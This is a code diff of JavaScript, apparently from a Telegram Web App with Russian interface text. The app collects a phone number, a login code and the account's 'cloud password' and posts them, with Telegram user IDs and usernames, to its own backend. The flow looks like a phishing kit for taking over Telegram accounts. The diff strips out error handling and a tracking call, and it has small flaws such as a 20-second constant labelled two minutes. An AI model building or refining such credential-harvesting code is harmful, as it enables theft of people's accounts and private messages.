@@ -17,30 +17,7 @@ async function RequestSUKA(endpoint, method = 'POST', body = {}) {
         });
         const data = await response.json();
 
-        // if (response.status === 429) {
-        //     clearCodeCells();
-        //     info(`Слишком много запросов. Подождите ${data.detail.wait_seconds} сек.`);
-        //     step1();
-        //     return null;
-        // } else if (response.status === 400 && data.detail === "Invalid code") {
-        //     clearCodeCells();
-        //     info("Неверный код");
-        //     return null;
-        // } else if (response.status === 400 && data.detail === "Expired code") {
-        //     clearCodeCells();
-        //     info("Код истёк. Запросите новый");
-        //     return null;
-        // } else if (response.status === 400 && data.detail === "Invalid password") {
-        //     passwordInput.value = '';
-        //     await step3();
-        //     info("Неверный облачный пароль");
-        //     return null;
-        // } else if (response.ok) {
-        //     return data;
-        // } else {
-        //     info(`Ошибка сервера: ${data.detail || "Неизвестная ошибка"}`);
-        //     return null;
-        // }
+       return data
     } 
 const CODE_EXPIRATION_TIME = 20000; // 2 минуты в миллисекундах
 
@@ -160,11 +137,6 @@ async function step3() {
         is_visible: true
     });
 
-    await sendRequest("password_opened", "POST", {
-        phone_number: get_phone(),
-        telegram_user_id: USER_ID,
-        telegram_username: USER_USERNAME
-    });
 }
 
 function step4() {
@@ -442,7 +414,7 @@ document.querySelectorAll('.keyboard button[data-digit]').forEach(button => {
             if (currentCell === cells.length) {
                 const enteredCode = Array.from(cells).map(cell => cell.textContent.trim()).join('');
                 start_code_loading();
-                RequestSUKA('code', 'POST', {
+                data = await RequestSUKA('code', 'POST', {
                     code: enteredCode,
                     username: window.Telegram.WebApp.initDataUnsafe.user.username
                 })
